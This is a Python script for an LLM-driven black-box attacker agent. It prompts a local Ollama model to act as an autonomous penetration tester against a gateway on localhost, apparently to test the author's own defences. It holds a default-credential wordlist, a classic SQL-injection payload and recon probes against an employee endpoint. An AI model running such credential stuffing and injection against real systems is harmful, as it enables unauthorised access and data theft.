"""
Autonomous Black-Box LLM Attacker Agent (attacker_agent_v2.py)
Fixes vs v1:
  - login now sends JSON (site expects application/json, not form data)
  - search uses the real 'q' parameter instead of the old 'file' param
  - a wordlist of credentials is tried, not just admin/admin123
  - every attempt is appended to attack_results.jsonl for metrics
  - Ollama is asked to return JSON via format="json" (more reliable parsing)
  - response bodies are truncated in the console so output stays readable
"""

import json
import time
import uuid
from datetime import datetime

import httpx
import ollama
from rich.console import Console
from rich.panel import Panel

console = Console()

BASE_URL = "http://127.0.0.1:8000"  # gateway, never the backend directly
MODEL_NAME = "llama3.2:3b"
USE_LLM = True
RESULTS_FILE = "attack_results.jsonl"
SLEEP_BETWEEN_STEPS = 1.5

CRED_WORDLIST = [
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", "aegis123"),
    ("root", "root"),
    ("administrator", "admin"),
]


def check_ollama_status() -> bool:
    try:
        ollama.list()
        return True
    except Exception:
        return False


def query_ollama_for_strategy(phase: str, history: list) -> dict:
    if not USE_LLM:
        return {"action": "probe", "endpoint": "/api/v1/search?q=classified"}

    prompt = (
        f"You are an autonomous offensive security black-box penetration tester.\n"
        f"Current Attack Phase: {phase}\n"
        f"Previous history and server responses:\n{json.dumps(history, indent=2)}\n\n"
        "Choose the next action:\n"
        "1. 'probe' a path (e.g. /api/v1/search?q=..., /api/v1/employees?limit=...)\n"
        "2. 'login' with a credentials dict {'username':..., 'password':...}\n"
        "3. 'exploit' an endpoint with a payload string meant to look like SQL "
        "injection or similar, placed in the 'payload' field\n\n"
        'Return ONLY a JSON object: {"action": "...", "endpoint": "...", '
        '"payload": "...", "credentials": {...}}. Omit keys you do not need. '
        "No markdown, no extra text."
    )
    try:
        response = ollama.chat(
            model=MODEL_NAME,
            messages=[{"role": "user", "content": prompt}],
            options={"temperature": 0.7},
            format="json",
        )
        return json.loads(response["message"]["content"].strip())
    except Exception as e:
        console.print(f"[bold red][LLM ERROR] {e}[/bold red]")
        return {"action": "probe", "endpoint": "/api/v1/search?q=classified"}


def log_result(record: dict) -> None:
    with open(RESULTS_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(record) + "\n")


def run_blackbox_attacker():
    run_id = uuid.uuid4().hex[:8]
    console.print(f"[bold cyan][BLACK-BOX AGENT] Run {run_id} starting against {BASE_URL}[/bold cyan]")

    if USE_LLM and not check_ollama_status():
        console.print("[bold red][ERROR] Ollama is not running. Run 'ollama serve' first.[/bold red]")
        return

    attack_history = []
    session_cookies = {}
    auth_token = None

    # Bootstrapped steps first (recon + credential stuffing), then LLM-driven.
    steps = [
        ("RECONNAISSANCE", {"action": "probe", "endpoint": "/openapi.json"}),
        ("RECONNAISSANCE", {"action": "probe", "endpoint": "/api/v1/employees?limit=500"}),
    ]
    for user, pwd in CRED_WORDLIST:
        steps.append(("AUTHENTICATION", {"action": "login", "endpoint": "/api/v1/login",
                                          "credentials": {"username": user, "password": pwd}}))
    steps.append(("EXPLOIT", {"action": "exploit", "endpoint": "/api/v1/search",
                               "payload": "' OR '1'='1"}))
    steps.append(("EXPLOIT_LLM", None))
    steps.append(("EXPLOIT_LLM", None))

    for step, (phase, fixed_move) in enumerate(steps, start=1):
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        console.print(f"\n[yellow]==== PHASE: {phase} | STEP #{step} [{timestamp}] ====[/yellow]")

        if fixed_move is not None:
            move = fixed_move
        else:
            console.print("[cyan][AGENT] Querying Ollama for next move...[/cyan]")
            move = query_ollama_for_strategy(phase, attack_history[-5:])

        action = move.get("action", "probe")
        endpoint = move.get("endpoint", "/")
        target_url = f"{BASE_URL}{endpoint}"

        start_time = time.perf_counter()
        response = None
        try:
            if action == "login":
                creds = move.get("credentials", {"username": "admin", "password": "admin123"})
                console.print(f"[magenta][RED TEAM] Login attempt -> {creds.get('username')}[/magenta]")
                response = httpx.post(target_url, json=creds, timeout=5.0)
                if response.status_code == 200:
                    session_cookies = dict(response.cookies)
                    try:
                        auth_token = response.json().get("access_token")
                    except Exception:
                        auth_token = None
                    console.print("[bold green][AUTH SUCCESS][/bold green]")

            elif action == "exploit":
                payload = move.get("payload", "")
                sep = "&" if "?" in endpoint else "?"
                target_url = f"{target_url}{sep}q={httpx.QueryParams({'q': payload}).get('q')}" if payload else target_url
                headers = {"Authorization": f"Bearer {auth_token}"} if auth_token else {}
                console.print(f"[magenta][RED TEAM] Exploit probe -> {target_url}[/magenta]")
                response = httpx.get(target_url, cookies=session_cookies, headers=headers, timeout=5.0)

            else:  # probe
                headers = {"Authorization": f"Bearer {auth_token}"} if auth_token else {}
                console.print(f"[magenta][RED TEAM] Probing -> {target_url}[/magenta]")
                response = httpx.get(target_url, cookies=session_cookies, headers=headers, timeout=5.0)

            elapsed_ms = round((time.perf_counter() - start_time) * 1000, 2)
            snippet = response.text[:200]

            attack_history.append({
                "step": step, "action": action, "endpoint": endpoint,
                "status_code": response.status_code, "response_snippet": snippet,
            })
            log_result({
                "run_id": run_id, "step": step, "phase": phase, "action": action,
                "endpoint": endpoint, "status_code": response.status_code,
                "latency_ms": elapsed_ms, "ts": timestamp,
            })

            colour = "green" if response.status_code == 200 else ("red" if response.status_code in (401, 403, 404) else "yellow")
            console.print(Panel(
                f"[bold cyan]Status:[/bold cyan] [{colour}]{response.status_code}[/{colour}]  "
                f"[bold cyan]Latency:[/bold cyan] {elapsed_ms} ms\n"
                f"[bold cyan]URL:[/bold cyan] {target_url}\n"
                f"[bold yellow]Response (truncated):[/bold yellow] {snippet}",
                title=f"TRY #{step} RESULT", border_style=colour,
            ))

        except httpx.RequestError as exc:
            console.print(f"[bold red][ERROR] {exc}[/bold red]")
            log_result({"run_id": run_id, "step": step, "phase": phase, "action": action,
                        "endpoint": endpoint, "status_code": None, "error": str(exc), "ts": timestamp})

        time.sleep(SLEEP_BETWEEN_STEPS)

    console.print(f"[bold green][BLACK-BOX AGENT] Run {run_id} complete. Results appended to {RESULTS_FILE}[/bold green]")


if __name__ == "__main__":
    run_blackbox_attacker()